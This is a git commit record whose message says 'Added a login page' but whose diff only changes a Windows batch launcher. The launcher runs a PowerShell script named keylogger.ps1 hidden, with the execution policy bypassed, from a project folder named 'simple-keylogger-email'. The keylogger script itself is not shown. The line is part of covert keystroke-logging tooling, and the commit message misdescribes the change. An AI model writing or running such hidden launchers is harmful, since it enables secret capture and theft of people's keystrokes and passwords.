842d80fe9cd3c762101e9a1245be616ff5d34e30
Lester <louis.tant@gmail.com>
2017-12-11 21:25:38 -0500

    Added a login page

--- launcher.bat
+++ launcher.bat
@@ -1,2 +1,2 @@
 @echo off
-Powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "C:\Users\Lester\Desktop\keylogger.ps1"
+Powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "C:\Dev\simple-keylogger-email\keylogger.ps1"
